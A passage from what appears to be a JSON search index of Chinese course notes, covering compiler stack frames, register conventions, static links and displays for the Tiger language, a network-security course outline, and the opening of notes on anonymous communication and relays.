"title": "\u6d3b\u52a8\u8bb0\u5f55\u7684\u8bbe\u8ba1", "text": "<p>\u300a\u6df1\u5165\u7406\u89e3\u8ba1\u7b97\u673a\u7cfb\u7edf\u300b\u4e2d\u7684 Stack Frame \u4f8b\u5b50</p> <p>Stack Frame \u4ece\u9ad8\u5730\u5740\u5f80\u4f4e\u5730\u5740\u589e\u957f</p> <p>\u5bf9\u4e8e Frame \u548c Stack \u6307\u9488\uff1a</p> <p></p> <ul> <li>Frame Pointer (FP) (base pointer, \u57fa\u5740\u5bc4\u5b58\u5668)<ul> <li>\u6307\u5411\u5f53\u524d\u5e27\u7684\u8d77\u59cb\u4f4d\u7f6e</li> <li>\u7f16\u7f16\u8bd1\u4ee3\u7801\u5f15\u7528\u5c40\u90e8\u53d8\u91cf\u548c\u53c2\u6570\u7684\u65b9\u5f0f\u662f\u4f7f\u7528\u5e27\u6307\u9488\u7684\u504f\u79fb\u91cf</li> <li>E.g., x86: <code>ebp</code>, <code>rbp</code>; ARM: <code>fp</code></li> </ul> </li> <li>Stack Pointer (SP) (top of stack, \u6808\u9876\u6307\u9488)<ul> <li>\u6307\u5411\u5f53\u524d\u5e27\u7684\u6808\u9876 (\u6700\u4f4e\u5730\u5740)</li> <li>Referring to the top of the stack</li> <li>E.g., x86: <code>esp</code>, <code>rsp</code>; ARM: <code>sp</code></li> </ul> </li> </ul> Workflow Of Function Call <p>f(\u2026) \u51fd\u6570\u8c03\u7528 g(a1, \u2026, an) \u51fd\u6570\u7684\u8fc7\u7a0b\uff1a</p> <ul> <li>\u5f53 f \u8c03\u7528 g \u65f6:<ul> <li>\u5806\u6808\u6307\u9488\u6307\u5411f\u4f20\u9012\u7ed9g\u7684\u7b2c\u4e00\u4e2a\u53c2\u6570</li> <li>g \u901a\u8fc7\u7b80\u5355\u5730\u4ece\u5806\u6808\u6307\u9488\uff08SP\uff09\u51cf\u53bb\u5e27\u5927\u5c0f\u6765\u5206\u914d\u4e00\u4e2a\u5e27</li> </ul> </li> <li>\u5f53\u8fdb\u5165 g \u65f6\uff1a<ul> <li>\u5c06\u65e7\u7684\u5e27\u6307\u9488FP\u4fdd\u5b58\u5728\u5e27\u4e2d\u7684\u5185\u5b58\u4e2d</li> <li><code>FP = SP</code></li> </ul> </li> <li>\u5f53\u4ece g \u8fd4\u56de\u65f6\uff1a<ul> <li><code>SP = FP</code></li> <li>\u6062\u590d\u4fdd\u5b58\u7684\u65e7\u5e27\u6307\u9488 (FP)</li> </ul> </li> </ul>"}, {"location": "Course/cp/semantic/#use-of-registers", "title": "Use of Registers", "text": "<p>How to reduce memory traffic?</p> Recap: Memory Hierarchy <ul> <li>\u8bbf\u95ee\u5bc4\u5b58\u5668\u6bd4\u8bbf\u95ee\u5185\u5b58\u5feb\u5f97\u591a</li> </ul> <p></p> <ul> <li>Problem: Putting everything in the stack frame can cause the memory traffic</li> <li>Solution: Hold as much of the frame as possible in registers<ul> <li>(Some) function parameters</li> <li>Function return address</li> <li>Function return value</li> <li>(Some) Local variables</li> <li>(Some) Intermediate results of expressions (temporaries)</li> </ul> </li> </ul>"}, {"location": "Course/cp/semantic/#using-registers", "title": "Using Registers: \u53c2\u6570\u4f20\u9012", "text": "Tiger \u7684\u53c2\u6570\u65b9\u5f0f\uff1aCall-by-Value <ul> <li>\u5b9e\u9645\u53c2\u6570\u7684\u503c\u88ab\u4f20\u9012\u5e76\u4f5c\u4e3a\u5f62\u5f0f\u53c2\u6570\u7684\u503c\u786e\u7acb\u3002</li> </ul> <p>\u5bf9\u5f62\u5f0f\u53c2\u6570\u7684\u4fee\u6539\u4e0d\u4f1a\u5f71\u54cd\u5b9e\u9645\u53c2\u6570\u3002</p> <p>Problem: passing parameter stack causes memory traffic</p> <p>Solution (\u73b0\u4ee3\u673a\u5668\u7684\u53c2\u6570\u4f20\u9012\u7ea6\u5b9a)\uff1a</p> <ul> <li>The first k arguments ( k = 4 or 6) are passed in registers </li> <li>The rest are passed on the stack</li> </ul> <p>\u867d\u7136\u901a\u8fc7\u5c06\u90e8\u5206\u53c2\u6570\u4f20\u9012\u5230\u5bc4\u5b58\u5668\u4e2d\u53ef\u4ee5\u51cf\u5c11\u5185\u5b58\u6d41\u91cf\uff0c\u4f46\u662f\u8fd9\u79cd\u65b9\u6cd5\u4e5f\u6709\u4e00\u4e9b\u95ee\u9898 : extra memory traffic caused by passing arguments in registers!</p> <p>Solution: \u201cSaving\u201d the status of registers</p> More about Register Saving Conventions <p></p> <p>\u8003\u8651\u4e00\u79cd\u573a\u666f:</p> <pre><code>f(int a) {\n    int z = ...\n    h(z);\n    ...\n    int t = a + 1;\n    ...\n}\n</code></pre> <ul> <li>\u5047\u5982 <code>f</code> \u4ece\u5bc4\u5b58\u5668 <code>r1</code> \u4e2d\u5f97\u5230\u53c2\u6570 <code>a</code>\uff0c\u968f\u540e\u901a\u8fc7\u5bc4\u5b58\u5668 <code>r1</code> \u5c06 <code>z</code> \u4f20\u9012\u7ed9 <code>h</code></li> <li>\u90a3\u4e48 <code>f</code> \u5728\u8c03\u7528 <code>h</code> \u4e4b\u524d\u9700\u8981\u4fdd\u5b58 <code>r1</code> \u7684\u72b6\u6001\uff0c\u4ee5\u4fbf\u5728\u8c03\u7528 <code>h</code> \u4e4b\u540e\u6062\u590d</li> </ul> <p>\u5982\u4f55\u907f\u514d <code>extra memory traffic</code> \u5462\uff1f</p> <ol> <li>\u5982\u679c\u5728 <code>f</code> \u4e2d\u8c03\u7528 <code>h</code> \u4e4b\u524d\uff0c<code>a</code> \u5df2\u7ecf\u662f\u4e00\u4e2a <code>dead variable</code>\uff0c\u90a3\u4e48\u5c31\u4e0d\u9700\u8981\u4fdd\u5b58 <code>r1</code> \u7684\u72b6\u6001 (\u6bd4\u5982\uff0c\u4e0d\u5b58\u5728\u7b2c\u4e94\u884c\uff0c\u90a3\u4e48\u5c31\u9700\u8981\u5bf9\u4ee3\u7801\u9884\u5148\u505a\u5206\u6790)</li> <li>\u4e5f\u53ef\u4ee5\u4f7f\u7528 <code>global register allocation</code>: \u4e0d\u540c\u7684\u51fd\u6570\u4f7f\u7528\u4e0d\u540c\u7684\u5bc4\u5b58\u5668\u7ec4\uff0c\u8fd9\u6837\u5c31\u4e0d\u9700\u8981\u4fdd\u5b58\u5bc4\u5b58\u5668\u72b6\u6001 (\u4f8b\u5982\uff0c<code>r1</code> \u53ef\u4ee5\u7528\u4e8e <code>f</code>\uff0c<code>r2</code> \u53ef\u4ee5\u7528\u4e8e <code>h</code>)</li> <li>Leaf procedures (\u6ca1\u6709\u8c03\u7528\u5176\u4ed6\u51fd\u6570\u7684\u51fd\u6570) \u53ef\u4ee5\u4e0d\u4fdd\u5b58\u5bc4\u5b58\u5668\u72b6\u6001</li> <li>\u4f7f\u7528 <code>register windows</code> (SPARC)\uff1a\u6bcf\u4e2a\u51fd\u6570\u8c03\u7528\u53ef\u4ee5\u7533\u8bf7\u4e00\u7ec4\u65b0\u7684\u5bc4\u5b58\u5668\uff0c\u8fd9\u6837\u5c31\u4e0d\u9700\u8981\u4fdd\u5b58\u5bc4\u5b58\u5668\u72b6\u6001</li> </ol>"}, {"location": "Course/cp/semantic/#using-registers-others", "title": "Using Registers: Others", "text": "<p>1) \u5bf9\u4e8e\u8fd4\u56de\u5730\u5740\uff1a</p> <ul> <li>\u5728\u73b0\u4ee3\u673a\u5668\u4e0a\uff0c\u8c03\u7528\u6307\u4ee4\u53ea\u662f\u5c06\u8fd4\u56de\u5730\u5740\u653e\u5230\u6307\u5b9a\u7684\u5bc4\u5b58\u5668\u4e2d\uff1b</li> <li>nonleaf procedures \u5fc5\u987b\u5c06\u5176\u5199\u5165\u5806\u6808\uff08\u9664\u975e\u4f7f\u7528\u4e86 interprocedural register\uff09, \u53f6\u5b50\u8fc7\u7a0b\u5219\u4e0d\u9700\u8981</li> </ul> <p>2) \u5bf9\u4e8e\u8fd4\u56de\u503c\uff1a</p> <ul> <li>\u901a\u5e38\u60c5\u51b5\u4e0b\uff0c\u8fd4\u56de\u503c\u88ab callee \u653e\u5728\u6307\u5b9a\u7684\u5bc4\u5b58\u5668\u4e2d</li> </ul> <p>3) \u5bf9\u4e8e Locals and Tempories:</p> <ul> <li>\u4e00\u4e9b\u5c40\u90e8\u53d8\u91cf\u548c\u4e34\u65f6\u53d8\u91cf\uff08\u5982\u8868\u8fbe\u5f0f\u7684\u4e2d\u95f4\u7ed3\u679c\uff09\u53ef\u4ee5\u653e\u5728\u5bc4\u5b58\u5668\u4e2d\uff0c\u4ee5\u51cf\u5c11\u5185\u5b58\u6d41\u91cf</li> </ul> <p>\u5728\u5bc4\u5b58\u5668\u5206\u914d\u4e00\u8282\u4e2d\u8be6\u7ec6\u8ba8\u8bba\u5173\u4e8e\u5c40\u90e8\u53d8\u91cf\u548c\u4e34\u65f6\u53d8\u91cf\u7684\u95ee\u9898</p>"}, {"location": "Course/cp/semantic/#frame-resident-variables", "title": "Frame-Resident Variables", "text": "<p>A variable will be allocated in stack frames because:</p> <ul> <li>It is passed by reference\uff0c\u56e0\u6b64\u4ed6\u5fc5\u987b\u8981\u6709\u4e00\u4e2a\u5185\u5b58\u5730\u5740</li> <li>Its address is taken, \u4f8b\u5982\uff0c\u901a\u8fc7 <code>&amp;</code> \u64cd\u4f5c\u7b26</li> <li>It is accessed by a procedure nested inside the current one; | \u5b83\u901a\u8fc7\u5f53\u524d\u7a0b\u5e8f\u4e2d\u5d4c\u5957\u7684\u7a0b\u5e8f\u6765\u8bbf\u95ee\uff1b </li> <li>\u8fd9\u4e2a\u503c\u592a\u5927\uff0c\u65e0\u6cd5\u653e\u5165\u5355\u4e2a\u5bc4\u5b58\u5668\u4e2d\uff1b  </li> <li>\u8be5\u53d8\u91cf\u662f\u4e00\u4e2a \u6570\u7ec4\uff0c\u9700\u8981\u8fdb\u884c\u5730\u5740\u8fd0\u7b97\u6765\u63d0\u53d6\u7ec4\u4ef6\uff1b  </li> <li>\u4fdd\u5b58\u53d8\u91cf\u7684\u5bc4\u5b58\u5668\u6709\u7279\u5b9a\u7528\u9014\uff0c\u6bd4\u5982\u4f20\u9012\u53c2\u6570\uff08\u5982\u4e0a\u6240\u8ff0\uff09\uff1b  </li> <li>\u5c40\u90e8\u53d8\u91cf\u548c\u4e34\u65f6\u53d8\u91cf\u592a\u591a\uff0c\u5bfc\u81f4\u201c\u6ea2\u51fa\u201d \uff08\u5c06\u5728\u8ba8\u8bba\u5bc4\u5b58\u5668\u5206\u914d\u65f6\u8be6\u8ff0\uff09</li> </ul> \u9003\u9038\u60c5\u51b5 <p>The variable escapes<sup>1</sup> for any of the reasons:</p> <ul> <li>\u901a\u8fc7\u5f15\u7528\u4f20\u9012\uff0c\u56e0\u6b64\u5b83\u5fc5\u987b\u6709\u4e00\u4e2a\u5185\u5b58\u5730\u5740\uff1b</li> <li>\u5b83\u7684\u5730\u5740\u88ab\u83b7\u53d6\uff0c\u4f8b\u5982\uff0c\u5728C\u8bed\u8a00\u4e2d\u662f <code>&amp;a</code>\uff1b</li> <li>\u5b83\u88ab\u5f53\u524d\u51fd\u6570\u5185\u90e8\u7684\u5d4c\u5957\u8fc7\u7a0b\u8bbf\u95ee\u3002</li> </ul> Example <p>pass-by-reference (\u5728 Pascal \u4e2d\u652f\u6301\uff0c\u4f46 Tiger \u4e0d\u652f\u6301)\uff1a</p> <ul> <li>\u771f\u5b9e\u7684\u53d8\u91cf\u4f4d\u7f6e\u4f20\u9012\uff1b</li> <li>\u5bf9\u5f62\u5f0f\u53c2\u6570\u7684\u5f15\u7528\u9690\u542b\u7740\u8bbf\u95ee\u5b9e\u9645\u53c2\u6570\u503c\u7684\u95f4\u63a5\u8bbf\u95ee\u3002</li> <li>\u5bf9\u5f62\u5f0f\u53c2\u6570\u7684\u4fee\u6539\u786e\u5b9e\u4f1a\u6539\u53d8\u5b9e\u9645\u53c2\u6570\uff01</li> </ul>"}, {"location": "Course/cp/semantic/#block-structure", "title": "Block Structure", "text": "<p>Tiger \u8bed\u8a00\u5d4c\u5957\u51fd\u6570\u7684\u5b9e\u73b0</p>"}, {"location": "Course/cp/semantic/#static-link", "title": "Static Link (\u91cd\u70b9)", "text": "<p>\u4f7f\u7528 static link \u7684\u52a8\u673a\u6e90\u81ea\u4e8e block structure \u7684\u5b9e\u73b0</p> <p></p> <p>Abstract</p> <p>Whenever a function g is called, it can be passed a pointer to the frame of the function statically enclosing g; this pointer is the static link. | \u6bcf\u5f53\u51fd\u6570 g \u88ab\u8c03\u7528\u65f6\uff0c\u53ef\u4ee5\u4f20\u5165\u4e00\u4e2a\u6307\u5411\u9759\u6001\u5305\u56f4 g \u7684\u51fd\u6570\u5e27\u7684\u6307\u9488\uff1b\u8fd9\u4e2a\u6307\u9488\u5c31\u662f\u9759\u6001\u94fe\u63a5\u3002</p> <p></p> <p>\u8003\u8651\u4e0a\u56fe\uff0cStatic Link -&gt; \u6bcf\u5f53\u51fd\u6570 g \u88ab\u8c03\u7528\u65f6\uff0c\u5b83\u4f1a\u63a5\u6536\u5230\u4e00\u4e2a\u6307\u9488\uff0c\u8be5\u6307\u9488\u6307\u5411\u7a0b\u5e8f\u6587\u672c\u4e2d\u7acb\u5373\u5305\u56f4 g \u7684 f \u51fd\u6570\u7684\u6700\u65b0\u6d3b\u52a8\u8bb0\u5f55\uff5cWhenever g is called, it is passed pointer to most recent activation record of f that immediately encloses g in program text</p> <p>The static link is a pointer to the activation record of the enclosing procedure</p> <p>\u53ef\u4ee5\u4f7f\u7528 static link \u8bbf\u95ee non-local data:</p> <ul> <li>\u6bcf\u4e2a\u51fd\u6570\u6807\u6709\u5176\u5d4c\u5957\u6df1\u5ea6</li> <li>\u5f53\u6df1\u5ea6\u4e3a n \u7684\u51fd\u6570\u8bbf\u95ee\u6df1\u5ea6\u4e3a m \u7684\u53d8\u91cf\u65f6\uff0c\u751f\u6210\u4ee3\u7801\u4ee5\u5411\u4e0a\u722c n-m \u5c42 link\uff0c\u4ee5\u8bbf\u95ee\u5408\u9002\u7684\u6d3b\u52a8\u8bb0\u5f55</li> </ul> Example Cstatic link <pre><code>int f (int x, int y)\n{\n    int m;\n    int g (int z)\n    {\n        int h ()\n        {\n            return m + z;\n        }\n        return 1;\n    }\n    return 0;\n}\n</code></pre> <pre><code>int f(link, int x, int y)\n{\n    int m;\n    int g(link, int z)\n    {\n        int h(link)\n        {\n            return link-&gt;prev-&gt;m + link-&gt;z;\n        }\n        return 1;\n    }\n    return 0;\n}\n</code></pre> \u4f18\u7f3a\u70b9 <ul> <li>\u4f18\u70b9\uff1a<ul> <li>Little extra overhead on parameter passing</li> </ul> </li> <li>\u7f3a\u70b9\uff1a(\u4e3b\u8981\u662f climb up link \u7684\u5f00\u9500)<ul> <li>\u9700\u8981\u4e3a\u6bcf\u4e2a\u53d8\u91cf\u8bbf\u95ee\u5efa\u7acb\u4e00\u7cfb\u5217\u95f4\u63a5\u5185\u5b58\u5f15\u7528</li> <li>\u95f4\u63a5\u5f15\u7528\u7684\u6570\u91cf\u7b49\u4e8e\u53d8\u91cf\u58f0\u660e\u51fd\u6570\u548c\u4f7f\u7528\u51fd\u6570\u4e4b\u95f4\u7684\u5d4c\u5957\u6df1\u5ea6\u5dee</li> <li>\u51fd\u6570\u53ef\u80fd\u6df1\u5d4c\u5957\uff01</li> </ul> </li> </ul>"}, {"location": "Course/cp/semantic/#lambda-lifting", "title": "Lambda Lifting", "text": "<p>Abstract</p> <p>When f calls g, each variable of f that is actually accessed by g (or by any function nested inside g) is passed to g as an extra argument. This is called lambda lifting. | \u5f53\u51fd\u6570f\u8c03\u7528\u51fd\u6570 g \u65f6\uff0cf \u4e2d\u88ab g\uff08\u6216 g \u5185\u90e8\u5d4c\u5957\u7684\u4efb\u4f55\u51fd\u6570\uff09\u5b9e\u9645\u8bbf\u95ee\u5230\u7684\u6bcf\u4e2a\u53d8\u91cf\uff0c\u90fd\u4f1a\u4f5c\u4e3a\u989d\u5916\u7684\u53c2\u6570\u4f20\u9012\u7ed9 g\u3002\u8fd9\u88ab\u79f0\u4e3a Lambda Lifting\u3002</p> <ul> <li>\u5f53\u51fd\u6570 g \u8c03\u7528 f \u65f6\uff0cf\uff08\u6216 f \u5185\u90e8\u5d4c\u5957\u7684\u4efb\u4f55\u51fd\u6570\uff09\u5b9e\u9645\u8bbf\u95ee\u7684 g \u4e2d\u7684\u6bcf\u4e2a\u53d8\u91cf\u90fd\u4f1a\u4f5c\u4e3a\u989d\u5916\u53c2\u6570\u4f20\u9012\u7ed9 f\u3002<ul> <li>\u901a\u8fc7\u5c06\u975e\u5c40\u90e8\u53d8\u91cf\u89c6\u4e3a\u5f62\u5f0f\u53c2\u6570\u6765\u91cd\u5199\u7a0b\u5e8f</li> </ul> </li> <li>\u8f6c\u6362\u8fc7\u7a0b\u4ece\u6700\u5185\u5c42\u7684\u7a0b\u5e8f\u5f00\u59cb\uff0c\u9010\u6e10\u5411\u5916\u5c42\u63a8\u8fdb\u3002</li> </ul> Example <p></p> <p>\u5177\u4f53\u5b9e\u73b0\u5e94\u8be5\u662f\u4f20\u5730\u5740</p>"}, {"location": "Course/cp/semantic/#display", "title": "Display", "text": "<p>Abstract</p> <p>A global array can be maintained, containing \u2013 in position i \u2013 a pointer to the frame of the most recently entered procedure whose static nesting depth is i. This array is called a display | \u53ef\u4ee5\u7ef4\u62a4\u4e00\u4e2a\u5168\u5c40\u6570\u7ec4\uff0c\u5176\u4e2d\u5728\u4f4d\u7f6ei\u5b58\u50a8\u6700\u8fd1\u8fdb\u5165\u7684\u3001\u9759\u6001\u5d4c\u5957\u6df1\u5ea6\u4e3a i \u7684\u7a0b\u5e8f\u7684\u5e27\u6307\u9488\u3002\u8fd9\u4e2a\u6570\u7ec4\u88ab\u79f0\u4e3a\u663e\u793a\u4f53\u3002</p> <p>Display: a global array of pointers to frames</p> <ul> <li>\u5b83\u8bb0\u5f55\u4e86\u7a0b\u5e8f\u7684\u8bcd\u6cd5\u5d4c\u5957\u7ed3\u6784</li> <li>\u5728\u4f4d\u7f6ei \u2014&gt; \u6307\u5411\u6700\u8fd1\u8fdb\u5165\u7684\u3001\u9759\u6001\u5d4c\u5957\u6df1\u5ea6\u4e3a i \u7684 procedure \u7684\u5e27\u7684\u6307\u9488</li> <li>\u672c\u8d28\u4e0a\uff0c\u5b83\u6307\u5411\u5f53\u524d\u8bbe\u7f6e\u7684\u5305\u542b\u53ef\u8bbf\u95ee\u53d8\u91cf\u7684\u6d3b\u52a8\u8bb0\u5f55\u96c6\u5408</li> </ul> Example <p></p>"}, {"location": "Course/cp/semantic/#stack-frame-in-tiger", "title": "Stack Frame in Tiger", "text": "<p>\u548c\u4e4b\u524d\u63d0\u5230\u7684 Stack frame \u53ef\u80fd\u6709\u6240\u4e0d\u540c\uff0c\u8003\u8bd5\u4ee5\u8fd9\u4e00\u90e8\u5206\u4e3a\u4e3b</p> <p>A Typical Stack Frame Layout for Tiger</p> <p></p> <ul> <li>incoming arguments: passed by the caller</li> <li>return address: where (within the calling function) control should return:<ul> <li>created by the CALL instruction</li> </ul> </li> <li>some local variables are in this frame, other local variables are kept in registers</li> <li>saved registers: make room for other uses of the registers</li> <li>outgoing argument: pass parameters to other functions</li> <li>static link</li> <li>Frame point \u4e3a\u7279\u5b9a\u5bc4\u5b58\u5668 (\u5982rbp, SP)\uff0c\u5176\u503c\u4e3a\u6808\u4e0a\u7684\u5185\u5b58\u5730\u5740<ul> <li>\u8be5\u5730\u5740\u7684\u5185\u5b58\u4e2d\u6240\u4fdd\u5b58\u503c\u662f stack link (\u67d0\u4e2a\u51fd\u6570\u7684 frame point)</li> </ul> </li> </ul> \u5173\u4e8e incoming &amp; outgoing arguments \u7684\u4f8b\u5b50 <p></p> <p>On each procedure call or variable access, a chain of zero or more fetches is required; the length of the chain is just the difference in static nesting depth between the two functions involved. | \u5728\u6bcf\u6b21\u51fd\u6570\u8c03\u7528\u6216\u53d8\u91cf\u8bbf\u95ee\u65f6\uff0c\u53ef\u80fd\u9700\u8981\u96f6\u4e2a\u6216\u591a\u4e2a\u53d6\u503c\u64cd\u4f5c\uff1b\u8fd9\u4e2a\u64cd\u4f5c\u94fe\u7684\u957f\u5ea6\u6b63\u662f\u6d89\u53ca\u7684\u4e24\u4e2a\u51fd\u6570\u4e4b\u95f4\u9759\u6001\u5d4c\u5957\u6df1\u5ea6\u7684\u5dee\u503c\u3002</p> <p>Important</p> <p>Static links may skip dynamic frames between f and g. They always point to the most recent frame of the routine that statically encloses the current routine. | \u9759\u6001\u94fe\u63a5\u53ef\u80fd\u4f1a\u8df3\u8fc7\u4ecb\u4e8e f \u548c g \u4e4b\u95f4\u7684\u52a8\u6001\u5e27\u3002\u5b83\u4eec\u59cb\u7ec8\u6307\u5411\u5f53\u524d\u7a0b\u5e8f\u88ab\u9759\u6001\u5305\u542b\u7684\u6700\u65b0\u5e27\u3002</p> Limitation of Stack Frame <ul> <li>Hard to support higher-order function: \u652f\u6301\u9ad8\u9636\u51fd\u6570\u8f83\u4e3a\u56f0\u96be, \u6d89\u53ca\u5d4c\u5957\u51fd\u6570\u4e0e\u51fd\u6570\u4f5c\u4e3a\u53c2\u6570\u53ca\u8fd4\u56de\u503c\u7684\u7ec4\u5408\u3002</li> <li>\u5728\u652f\u6301\u9ad8\u9636\u51fd\u6570\u7684\u8bed\u8a00\u4e2d\uff0c\u51fd\u6570\u8fd4\u56de\u540e\u53ef\u80fd\u9700\u8981\u4fdd\u7559\u5c40\u90e8\u53d8\u91cf\u3002</li> <li>\u4f46\u5230\u76ee\u524d\u4e3a\u6b62\uff0c\u6211\u4eec\u5047\u5b9a\u51fd\u6570 f \u8fd4\u56de\u540e\u5c40\u90e8\u53d8\u91cf\u4e0d\u4f1a\u88ab\u4f7f\u7528\uff08\u6240\u4ee5\u6211\u4eec\u4f7f\u7528\u6808\u6765\u5b58\u50a8\uff09</li> </ul> Pascal; Tiger C ML; LISP; Haskell Nested functions Yes No Yes Procedure passed as arguments and results No Yes Yes"}, {"location": "Course/cp/semantic/#tiger-frame", "title": "\u5173\u4e8e Tiger \u7f16\u8bd1\u5668\u4e2d Frame \u7684\u8865\u5145", "text": "<p>TODO</p> <ol> <li> <p>\u901a\u4fd7\u6765\u8bb2\uff0c\u5f53\u4e00\u4e2a\u5bf9\u8c61\u7684\u6307\u9488\u88ab\u591a\u4e2a\u65b9\u6cd5\u6216\u7ebf\u7a0b\u5f15\u7528\u65f6\uff0c\u5219\u79f0\u8fd9\u4e2a\u6307\u9488\u53d1\u751f\u4e86\u9003\u9038\u3002\u9003\u9038\u5206\u6790\u51b3\u5b9a\u4e00\u4e2a\u53d8\u91cf\u662f\u5206\u914d\u5728\u5806\u4e0a\u8fd8\u662f\u5206\u914d\u5728\u6808\u4e0a\u3002\u00a0\u21a9</p> </li> </ol>"}, {"location": "Course/netsec/", "title": "\u7f51\u7edc\u5b89\u5168\u539f\u7406\u4e0e\u5b9e\u8df5", "text": "<p> \u7ea6 526 \u4e2a\u5b57  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 2 \u5206\u949f</p> <p>\u672c\u8bfe\u7a0b\u4e3b\u8981\u4ecb\u7ecd\u57fa\u672c\u7684\u7f51\u7edc\u5b89\u5168\u653b\u9632\u624b\u6bb5\uff0c\u5177\u4f53\u5185\u5bb9\u4e3a\uff1a</p> <ul> <li> DDoS \u653b\u51fb\u4e0e\u9632\u5fa1\uff1a\u4ecb\u7ecd\u4e86\u5927\u91cf\u7684\u5bf9\u79f0\u4e0e\u975e\u5bf9\u79f0 DDoS \u653b\u51fb\u4ee5\u53ca\u9632\u5fa1\u624b\u6bb5</li> <li> \u5b89\u5168\u8def\u7531\uff1a\u5728\u56de\u987e\u8ba1\u7b97\u673a\u7f51\u7edc\u4e2d\u5b66\u4e60\u7684\u8def\u7531\u7b97\u6cd5\u548c\u534f\u8bae\u7684\u57fa\u7840\u4e0a\uff0c\u57fa\u4e8e\u8def\u7531\u7b97\u6cd5\u7684\u5f31\u70b9\u4ecb\u7ecd\u76f8\u5e94\u7684\u653b\u51fb\u548c\u9632\u5fa1\u65b9\u6848</li> <li> \u533f\u540d\u901a\u4fe1\uff1a\u4ecb\u7ecd\u901a\u8fc7\u4ee3\u7406\u8282\u70b9\u5b9e\u73b0\u533f\u540d\u901a\u4fe1\u7684\u65b9\u5f0f\uff0c\u7279\u522b\u662f\u6d0b\u8471\u8def\u7531\u7684\u6838\u5fc3\u7b97\u6cd5\uff0c\u4ee5\u53ca\u76f8\u5e94\u7684\u653b\u51fb\u624b\u6bb5</li> <li> Web \u5b89\u5168\uff1a\u4ecb\u7ecd web \u57fa\u7840\u3001SQL \u6ce8\u5165\u3001\u540c\u6e90\u7b56\u7565\u3001\u8de8\u7ad9\u653b\u51fb\u7b49\u5e38\u89c1\u7684 web \u5b89\u5168\u95ee\u9898</li> <li> \u90ae\u4ef6\u5b89\u5168\uff1a\u4ecb\u7ecd\u90ae\u4ef6\u4f20\u8f93\u76f8\u5173\u7684\u8ba4\u8bc1\u7b97\u6cd5\uff0c\u6838\u5fc3\u662f\u90ae\u4ef6\u7684\u516c\u94a5\u8ba4\u8bc1\u4f53\u7cfb\u4e2d\u7684\u6574\u4f53\u67b6\u6784\u548c\u5173\u952e\u7b97\u6cd5</li> <li> \u6d41\u91cf\u5206\u6790\uff1a\u4ecb\u7ecd\u9632\u706b\u5899\u3001\u5165\u4fb5\u68c0\u6d4b\u7cfb\u7edf\uff08IDS\uff09\u3001\u5165\u4fb5\u9632\u5fa1\u7cfb\u7edf\uff08IPS\uff09\u7684\u539f\u7406</li> <li> \u56de\u6eaf\uff1a\u4ecb\u7ecd\u5982\u4f55\u56de\u6eaf\u653b\u51fb\u8005\u7684\u8eab\u4efd\uff0c\u5982 IP Traceback\uff0cLink Testing\uff0cLogging-based Traceback \u548c Bloom Filter \u7b49\u65b9\u6cd5\u7684\u539f\u7406</li> <li> \u7f51\u7edc\u4fdd\u62a4\uff1a\u56de\u987e\u524d\u9762\u7ae0\u8282\u4ecb\u7ecd\u7684\u9632\u706b\u5899\u3001\u5165\u4fb5\u68c0\u6d4b\u7cfb\u7edf\uff08IDS\uff09\u7b49\u5185\u5bb9\uff0c\u540c\u65f6\u4e5f\u4ecb\u7ecd\u8d1f\u8f7d\u5747\u8861\u3001\u7528\u6237\u8ba4\u8bc1\u3001\u8bbf\u95ee\u63a7\u5236\u7b49\u5185\u5bb9</li> </ul> Three Common properties to protect: <ul> <li>Confidentiality | \u4fdd\u5bc6\u6027 (not leaked to unauthorized parties)<ul> <li>Confidentiality\u00a0refers to protecting information from being accessed by unauthorized parties. In other words, only the people who are authorized to do so can gain access to sensitive\u00a0data.</li> </ul> </li> <li>Integrity | \u5b8c\u6574\u6027 (not modified)<ul> <li>Integrity is the maintenance of, and the assurance of the accuracy and consistency of,\u00a0data over its entire life-cycle, a\u00e5d is a critical aspect to the design, implementation and usage of any system which stores, processes, or retrieves\u00a0data.</li> </ul> </li> <li>Availability | \u53ef\u7528\u6027 (keep online, available when needed)<ul> <li>For any information system to serve its purpose, the information must be\u00a0available\u00a0when it is needed. This means the computing systems used to store and process the information, the\u00a0security controls\u00a0used to protect it, and the communication channels used to access it must be functioning correctly.\u00a0High-availability\u00a0systems aim to remain available at all times, preventing service disruptions due to power outages, hardware failures, and system upgrades. Ensuring availability also involves preventing\u00a0denial-of-service attacks, such as a flood of incoming messages to the target system, essentially forcing it to shut down.</li> </ul> </li> </ul> <p>Acknowledgement</p> <ul> <li>kaibu</li> <li>\u54b8\u9c7c\u6684</li> <li>Ryan</li> </ul>"}, {"location": "Course/netsec/anonymity/", "title": "Anonymous Communication", "text": "<p> \u7ea6 2258 \u4e2a\u5b57  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 8 \u5206\u949f</p> <p>\u5bf9\u4e8e Internet \u4e2d\u4ea4\u6d41\u7684\u53cc\u65b9 ip1 \u548c ip2, \u5982\u679c\u6709\u4e00\u4e2a attacker snooping on the communication, \u5c3d\u7ba1\u5b83\u53ef\u80fd\u4e0d\u77e5\u9053\u4e24\u4e2a\u7528\u6237\u7684\u8eab\u4efd\uff0c\u4e5f\u65e0\u6cd5\u77e5\u9053\u4ed6\u4eec\u88ab\u52a0\u5bc6\u7684\u901a\u4fe1\u5185\u5bb9\u3002\u4f46\u5b83\u8d77\u7801\u53ef\u4ee5\u4f7f\u7528\u4ed6\u4eec\u7684 ip</p> <p>Because, for users to communicate via internet, their devices assigned with IP addresses, which are usually fixed within a communication session or more;</p> <p>This can be used to infer critical privacy of users</p> Communication anonymity &amp; privacy: <ul> <li>who is communicating?</li> <li>who are you talking to?</li> <li>what type of activities?</li> <li>what type of information?</li> </ul> <p>1) Why wanted?</p> Anonymity for MortalsAnonymity for Attackers <ul> <li>Unmonitored access to health and medical information</li> <li>Preservation of democracy: anonymous election/jury</li> <li>Censorship circumvention: anonymous access to otherwise restricted information</li> </ul> <p>Misbehaviors without getting caught: Terrorism, Darknet, Spam, Pirate\u2026</p> <p>2) how to?</p> <p>\u901a\u8fc7\u52a0\u5bc6\uff08\u5982 HTTPS\uff09\u53ef\u4ee5\u4fdd\u62a4\u8bbf\u95ee\u7684\u5185\u5bb9\uff1b</p> <p>But even if we don\u2019t know what you communicated, knowing with whom you communicated leaks a lot of information as well</p> <p>Thus, we can hide destination address</p> <p>But here comes another question: </p> <ul> <li>According to routing, need to specify the ip address of destination to ensure packets being directed toward it,</li> <li>Then how to deliver packets to destination? \\(\\rightarrow\\) RELAY!</li> </ul> Relay <ul> <li>Relay (\u4e2d\u7ee7) 